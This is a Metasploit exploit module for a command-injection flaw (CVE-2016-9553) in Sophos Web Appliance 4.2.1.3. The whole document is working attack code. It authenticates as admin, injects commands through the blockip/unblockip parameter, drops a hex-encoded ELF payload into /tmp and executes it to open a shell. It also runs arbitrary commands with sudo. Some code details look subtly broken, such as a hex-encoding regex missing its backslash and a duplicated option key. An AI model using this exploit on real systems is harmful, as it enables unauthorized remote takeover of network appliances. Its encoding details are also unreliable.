# Date: 12/12/2016
# Exploit Author: xort @ Critical Start
# Vendor Homepage: www.sophos.com
# Software Link: sophos.com/en-us/products/secure-web-gateway.aspx
# Version: 4.2.1.3
# Tested on: 4.2.1.3
#
# CVE : CVE-2016-9553

# vuln 1: unblockip parameter / MgrReport.php exploit
# vuln 2: blockip parameter / MgrReport.php exploit

# Description PostAuth Sophos Web App FW <= v4.2.1.3 for capablities. This exploit leverages a command injection bug.
#
# xort @ Critical Start

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Exploit::Remote::Tcp
include Msf::Exploit::Remote::HttpClient

def initialize(info = {})
super(update_info(info,
&#039;Name&#039; => &#039;Sophos Web Appliace <= v4.2.1.3 block/unblock remote exploit&#039;,
&#039;Description&#039; => %q{
This module exploits two 2 seperate remote command injecection vulnerabilities in
the Sophos Web Appliace Version <= v4.2.1.3 the web administration interface.
By sending a specially crafted request it&#039;s possible to inject system
commands
},
&#039;Author&#039; =>
[
&#039;xort&#039;, # vuln + metasploit module
],
&#039;Version&#039; => &#039;$Revision: 2 $&#039;,
&#039;References&#039; =>
[
[ &#039;none&#039;, &#039;none&#039;],
],
&#039;Platform&#039; => [ &#039;linux&#039;],
&#039;Privileged&#039; => true,
&#039;Arch&#039; => [ ARCH_X86 ],
&#039;SessionTypes&#039; => [ &#039;shell&#039; ],
&#039;Privileged&#039; => false,

&#039;Payload&#039; =>
{
&#039;Compat&#039; =>
{
&#039;ConnectionType&#039; => &#039;find&#039;,
}
},

&#039;Targets&#039; =>
[
[
&#039;blockip method&#039;,
{
&#039;Arch&#039; => ARCH_X86,
&#039;Platform&#039; => &#039;linux&#039;,
&#039;VulnName&#039; => &#039;blockip&#039;,
&#039;VulnNum&#039; => &#039;1&#039;,
},
],
[
&#039;unblockip method&#039;,
{
&#039;Arch&#039; => ARCH_X86,
&#039;Platform&#039; => &#039;linux&#039;,
&#039;VulnName&#039; => &#039;unblockip&#039;,
&#039;VulnNum&#039; => &#039;2&#039;,
},
],
],
&#039;DefaultTarget&#039; => 0))

register_options(
[
OptString.new(&#039;PASSWORD&#039;, [ false, &#039;Device password&#039;, "" ]),
OptString.new(&#039;USERNAME&#039;, [ true, &#039;Device password&#039;, "admin" ]),
OptString.new(&#039;CMD&#039;, [ false, &#039;Command to execute&#039;, "" ]),
Opt::RPORT(443),
], self.class)
end


def do_login(username, password_clear)
vprint_status( "Logging into machine with credentials...\n" )

# vars
timeout = 11550;
style_key = Rex::Text.rand_text_hex(32)

# send request
res = send_request_cgi(
{
&#039;method&#039; => &#039;POST&#039;,
&#039;uri&#039; => "/index.php",
&#039;vars_get&#039; => {
&#039;c&#039; => &#039;login&#039;,
},
&#039;vars_post&#039; =>
{

&#039;STYLE&#039; => style_key,
&#039;destination&#039; => &#039;&#039;,
&#039;username&#039; => username,
&#039;password&#039; => password_clear,
}
}, timeout)

return style_key
end

def run_command(username, style_password, cmd)
vprint_status( "Running Command...\n" )

# random attack method from calling methods into
calling_commands = [ &#039;report&#039;,&#039;trend_volume&#039;,&#039;trend_suspect&#039;,&#039;top_app_ctrl&#039;,&#039;perf_latency&#039;,&#039;perf_throughput&#039;,&#039;users_browse_summary&#039;,&#039;traf_sites&#039;,&#039;traf_blocked&#039;,&#039;traf_users&#039;,&#039;users_virus_downloaders&#039;,&#039;users_pua_downloaders&#039;,&#039;users_highrisk&#039;,&#039;users_policy_violators&#039;,&#039;users_top_users_by_browse_time&#039;,&#039;users_quota&#039;,&#039;users_browse_time_by_user&#039;,&#039;users_top_users_by_category&#039;,&#039;users_site_visits_by_user&#039;,&#039;users_category_visits_by_user&#039;,&#039;users_monitored_search_queries&#039;,&#039;users_app_ctrl&#039;,&#039;traf_category&#039;,&#039;traf_download&#039; ,&#039;warned_sites&#039; ]

# select random calling page that calls the vulnerable page MgrReport.php where the vulns are
attack_method = calling_commands[rand(calling_commands.length)]

# random filename to dump too + &#039;tmp&#039; HAS to be here.
b64dumpfile = "/tmp/" + rand_text_alphanumeric(4+rand(4))

vprint_status( "Attacking Vuln #" + target[&#039;VulnNum&#039;]+ " - " + target[&#039;VulnName&#039;] + " with " + attack_method + "command method" )
res = send_request_cgi({
&#039;method&#039; => &#039;GET&#039;,
&#039;uri&#039; => &#039;/index.php?c=trend_suspect&&#039; + target[&#039;VulnName&#039;] + &#039;=1.2.3.6`&#039;+ cmd +&#039;`&STYLE=&#039;+style_password
})

end

def exploit
# timeout
timeout = 1550;

# params
password_clear = datastore[&#039;PASSWORD&#039;]
user = datastore[&#039;USERNAME&#039;]

style_hash = do_login(user, password_clear)

vprint_status("STATUS hash authenticated: #{style_hash}\n")

sleep(5)

#if no &#039;CMD&#039; string - add code for root shell
if not datastore[&#039;CMD&#039;].nil? and not datastore[&#039;CMD&#039;].empty?

cmd = datastore[&#039;CMD&#039;]

# Encode cmd payload
encoded_cmd = cmd.unpack("H*").join().gsub(/(w)(w)/,&#039;\x12&#039;)

run_command(user, style_hash, ("sudo /bin/rm -f /tmp/n ;printf "#{encoded_cmd}" > /tmp/n; chmod +rx /tmp/n ; /tmp/n" ))
else
# Encode payload to ELF file for deployment
elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
encoded_elf = elf.unpack("H*").join().gsub(/(w)(w)/,&#039;\\x12&#039;)

# upload elf to /tmp/m , chmod +rx /tmp/m , then run /tmp/m (payload)
run_command(user, style_hash, ("echo%20-e%20#{encoded_elf}>%20/tmp/m;chmod%20%2brx%20/tmp/m;/tmp/m"))
# wait for magic
handler

end


end
end

